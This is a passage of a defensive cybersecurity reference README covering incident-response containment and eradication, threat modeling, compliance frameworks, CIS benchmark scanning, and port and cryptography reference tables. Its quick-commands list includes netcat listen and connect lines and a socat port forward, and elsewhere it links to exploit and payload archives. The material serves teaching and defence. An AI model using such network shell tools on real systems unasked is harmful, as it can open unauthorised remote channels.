tar czf "${INCIDENT_DIR}.tar.gz" "$INCIDENT_DIR/"
echo "[*] Archive: ${INCIDENT_DIR}.tar.gz"
```

### IR Phase 3: Containment

```bash
# Isolate a compromised Linux host
# Option 1: Block all traffic except to IR team workstation
iptables -F
iptables -X
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -s IR_TEAM_IP -j ACCEPT
iptables -A OUTPUT -d IR_TEAM_IP -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Option 2: Disable network interface (more complete isolation)
ip link set eth0 down

# Preserve running processes before killing
# Take a snapshot (if VM)
# Or capture memory with LiME (Linux Memory Extractor)
# git clone https://github.com/504ensicslabs/lime
# cd lime/src && make
# sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# Preserve disk image before any changes
sudo dc3dd if=/dev/sda of=/mnt/external/disk_image.dd hash=sha256 log=/mnt/external/dc3dd.log

# Verify image integrity
sha256sum /mnt/external/disk_image.dd
```

### IR Phase 4: Eradication & Recovery

```bash
# Verify integrity of system binaries after incident
# Compare against baseline
sha256sum -c /root/baseline_hashes.txt 2>&1 | grep -v "OK"

# Check for rootkits
sudo apt install chkrootkit rkhunter
sudo chkrootkit
sudo rkhunter --update
sudo rkhunter --check --skip-keypress

# Scan with Maldet (Linux Malware Detect)
wget http://www.rfxn.com/downloads/maldetect-current.tar.gz
tar xzf maldetect-current.tar.gz
cd maldetect-*
sudo ./install.sh
sudo maldet --update-sigs
sudo maldet -a /

# After cleaning, verify all accounts
awk -F: '$3 == 0 {print $1}' /etc/passwd    # UID 0 users (should only be root)
awk -F: '$2 == "" {print $1}' /etc/shadow   # Users with no password
cat /etc/sudoers; ls /etc/sudoers.d/        # Sudo access
```

---

## 12. Threat Modeling

### STRIDE Framework

| Threat | Definition | Security Property Violated | Mitigation |
|--------|-----------|---------------------------|------------|
| **S**poofing | Impersonating users or systems | Authentication | MFA, digital signatures |
| **T**ampering | Modifying data or code | Integrity | HMAC, checksums, signing |
| **R**epudiation | Denying actions occurred | Non-repudiation | Audit logs, digital signatures |
| **I**nformation Disclosure | Data exposure | Confidentiality | Encryption, access control |
| **D**enial of Service | Making service unavailable | Availability | Rate limiting, redundancy |
| **E**levation of Privilege | Gaining unauthorized access | Authorization | Least privilege, sandboxing |

### PASTA (Process for Attack Simulation and Threat Analysis)

```
Stage 1: Define Objectives
└── What are the business objectives?
└── What are the security requirements?

Stage 2: Define Technical Scope
└── Application architecture
└── Infrastructure components
└── Trust boundaries

Stage 3: Decompose Application
└── Data Flow Diagrams (DFDs)
└── Identify entry/exit points
└── Enumerate assets

Stage 4: Threat Analysis
└── OSINT on similar systems
└── Known attack patterns
└── Threat actors and motivations

Stage 5: Weakness & Vulnerability Analysis
└── SAST/DAST results
└── CVE research for components
└── Configuration weaknesses

Stage 6: Attack Modeling
└── Attack trees
└── Attack scenarios per threat

Stage 7: Risk & Impact Analysis
└── Risk scoring (CVSS-like)
└── Business impact
└── Prioritized remediation
```

---

## 13. Compliance & Frameworks

### Framework Comparison

| Framework | Scope | Who Uses It | Key Focus |
|-----------|-------|-------------|-----------|
| **NIST CSF** | General cybersecurity | All organizations | Identify, Protect, Detect, Respond, Recover |
| **ISO 27001** | Information security ISMS | Enterprise, certification | Management system, controls |
| **SOC 2** | Service providers | Cloud/SaaS companies | Trust service criteria |
| **PCI DSS** | Payment card data | Any org handling card data | Cardholder data protection |
| **HIPAA** | Healthcare data (US) | Healthcare organizations | PHI protection |
| **GDPR** | Personal data (EU) | Any org with EU residents' data | Data rights, privacy |
| **CIS Controls** | Practical security | SMB to enterprise | 18 prioritized control groups |
| **MITRE ATT&CK** | Adversary tactics | SOC, threat hunters | Known attacker behaviors |

### MITRE ATT&CK Detection Mapping

```bash
# Install MITRE ATT&CK tools
pip install mitreattack-python

# Map alerts to ATT&CK techniques
python3 << 'EOF'
from mitreattack.stix20 import MitreAttackData

mitre_attack_data = MitreAttackData("enterprise-attack.json")

# Get technique by ID
technique = mitre_attack_data.get_technique_by_id("T1055")  # Process Injection
print(f"Name: {technique.name}")
print(f"Description: {technique.description[:200]}")

# Get all techniques in a tactic
techniques = mitre_attack_data.get_techniques_by_tactic("persistence")
for t in techniques[:5]:
    print(f"{t.external_id}: {t.name}")
EOF
```

### CIS Benchmarks Automation

```bash
# OpenSCAP — automated CIS benchmark assessment
sudo apt install openscap-scanner scap-security-guide

# List available profiles
oscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-xccdf.xml | grep "Profile\|Id:"

# Assess against CIS Level 1 profile
sudo oscap xccdf eval \
    --profile xccdf_org.ssgproject.content_profile_cis_level1_server \
    --results /tmp/cis_results.xml \
    --report /tmp/cis_report.html \
    /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-xccdf.xml

# View HTML report
firefox /tmp/cis_report.html

# Apply remediations (careful in production!)
sudo oscap xccdf remediate \
    --results-arf /tmp/cis_results.xml \
    /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-xccdf.xml
```

---

## 14. Reference Tables & Cheat Sheets

### Common Port Reference

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 20, 21 | TCP | FTP | Use SFTP instead; FTP transmits in plaintext |
| 22 | TCP | SSH | Change to non-default port; disable password auth |
| 23 | TCP | Telnet | Never use; plaintext protocol, deprecated |
| 25 | TCP | SMTP | Configure SPF/DKIM/DMARC |
| 53 | TCP/UDP | DNS | Monitor for DNS tunneling |
| 67, 68 | UDP | DHCP | Rogue DHCP detection |
| 80 | TCP | HTTP | Redirect all to HTTPS (443) |
| 110 | TCP | POP3 | Use POP3S (995) |
| 143 | TCP | IMAP | Use IMAPS (993) |
| 443 | TCP | HTTPS | Enforce TLS 1.2+; enable HSTS |
| 445 | TCP | SMB | Block externally; disable SMBv1 |
| 1433 | TCP | MS SQL | Never expose to internet |
| 1521 | TCP | Oracle DB | Never expose to internet |
| 3306 | TCP | MySQL | Bind to localhost only |
| 3389 | TCP | RDP | Enable NLA; change port; use VPN |
| 5432 | TCP | PostgreSQL | Bind to localhost; use pg_hba.conf |
| 5900 | TCP | VNC | Never expose unencrypted; use SSH tunnel |
| 6379 | TCP | Redis | Bind to localhost; enable authentication |
| 8080 | TCP | HTTP Alt | Development; secure before production |
| 27017 | TCP | MongoDB | Bind to localhost; enable auth always |

### Cryptography Algorithm Selection Guide

| Use Case | Recommended | Acceptable | Avoid |
|----------|-------------|-----------|-------|
| Password hashing | Argon2id, bcrypt (cost≥12) | scrypt | MD5, SHA-1, SHA-2, PBKDF2-SHA1 |
| Symmetric encryption | AES-256-GCM | ChaCha20-Poly1305 | AES-ECB, DES, 3DES, RC4 |
| Key exchange | X25519 (ECDH) | DH-4096 | DH-1024, RSA for key exchange |
| Digital signatures | Ed25519 | RSA-PSS (4096+), ECDSA P-256 | RSA-PKCS1v1.5, DSA, RSA-1024 |
| TLS version | TLS 1.3 | TLS 1.2 | TLS 1.0, 1.1, SSLv3, SSLv2 |
| Certificate | ECDSA P-256 or Ed25519 | RSA-4096 | RSA-1024, MD5-signed |
| Hash (non-password) | SHA-256/SHA-3 | SHA-512 | MD5, SHA-1 |
| MAC | HMAC-SHA256 | Poly1305 | Custom MAC, CRC |

### CVSS Score Reference

| CVSS Score | Severity | Priority |
|------------|----------|----------|
| 9.0 – 10.0 | Critical | Patch within 24 hours |
| 7.0 – 8.9 | High | Patch within 7 days |
| 4.0 – 6.9 | Medium | Patch within 30 days |
| 0.1 – 3.9 | Low | Patch in next maintenance cycle |
| 0.0 | None | No action required |

### Useful Security Resources

| Resource | URL | Type |
|----------|-----|------|
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ | Web security standards |
| NIST NVD CVE | https://nvd.nist.gov/ | Vulnerability database |
| MITRE CVE | https://cve.mitre.org/ | CVE source |
| MITRE ATT&CK | https://attack.mitre.org/ | Adversary tactics |
| VirusTotal | https://virustotal.com/ | File/URL/IP scanning |
| Shodan | https://shodan.io/ | Internet device search |
| Have I Been Pwned | https://haveibeenpwned.com/ | Breach checking |
| GTFOBins | https://gtfobins.github.io/ | Unix binary privesc |
| LOLBAS | https://lolbas-project.github.io/ | Windows LOL binaries |
| Exploit-DB | https://exploit-db.com/ | Public exploit archive |
| Vulhub | https://vulhub.org/ | Vulnerable environments |
| CIS Benchmarks | https://cisecurity.org/cis-benchmarks/ | Hardening guides |
| SANS Reading Room | https://sans.org/reading-room/ | Security papers |
| NIST SP 800-53 | https://csrc.nist.gov/publications/sp800 | Security controls |
| h4cker GitHub | https://github.com/The-Art-of-Hacking/h4cker | Learning resources |
| Security Checklist | https://github.com/Lissy93/personal-security-checklist | Personal security |
| SafeLine WAF | https://github.com/chaitin/SafeLine | Self-hosted WAF |
| Wazuh | https://github.com/wazuh/wazuh | Open source HIDS/EDR |
| Velociraptor | https://github.com/Velocidex/velociraptor | DFIR platform |
| OSCP Resources | https://github.com/rewardone/OSCPRepo | Penetration testing |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Security payloads |

### Linux Quick Commands Reference

```bash
# === PROCESS ===
ps aux | grep <name>          # Find process
kill -9 <pid>                 # Force kill
pkill -f <pattern>            # Kill by pattern
nice -n 10 <cmd>              # Run with lower priority
renice -n 5 -p <pid>          # Change running priority

# === NETWORKING ===
curl -I https://example.com   # HTTP headers only
wget -q -O - https://url | head  # Fetch URL quietly
nc -l 4444                    # Listen on port 4444
nc host 4444                  # Connect to port 4444
socat TCP-LISTEN:8080,fork TCP:target:80  # Port forward

# === FILE OPERATIONS ===
find / -name "*.conf" 2>/dev/null   # Find config files
locate *.log                         # Fast file locate
grep -r "pattern" /etc/             # Recursive grep
diff file1 file2                    # Compare files
md5sum file; sha256sum file         # Hashes
base64 file                         # Base64 encode
base64 -d file                      # Base64 decode
xxd file | head                     # Hex dump

# === USERS ===
id                                  # Current user info
sudo -l                             # List sudo privileges
who; w                              # Logged in users
last | head -20                     # Login history
cat /etc/passwd | cut -d: -f1       # All usernames

# === SYSTEM ===
df -h                               # Disk space
du -sh /*                           # Dir sizes
free -h                             # Memory
uptime                              # Load average
dmesg | tail                        # Recent kernel messages
lsmod                               # Kernel modules
lscpu                               # CPU info
lspci                               # PCI devices
lsusb                               # USB devices
lsblk                               # Block devices
```

---

## 15. License

```
MIT License

Copyright (c) 2024 [Your Name/Organization]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

> **⚠️ Disclaimer:** This document is intended strictly for educational and defensive security purposes. All techniques described are for authorized use on systems you own or have explicit written permission to test. Unauthorized testing of systems is illegal and unethical. Always obtain proper authorization before conducting any security assessments.

> **📌 Contributing:** Feel free to submit pull requests with corrections, additions, or improvements. All contributions must maintain the defensive and educational focus of this repository.

> **🔗 Related Repositories:**
> - [h4cker — Art of Hacking](https://github.com/The-Art-of-Hacking/h4cker)
> - [Personal Security Checklist](https://github.com/Lissy93/personal-security-checklist)
> - [SafeLine WAF](https://github.com/chaitin/SafeLine)
> - [Awesome Security](https://github.com/sbilly/awesome-security)
> - [Awesome Pentest](https://github.com/enaqx/awesome-pentest)
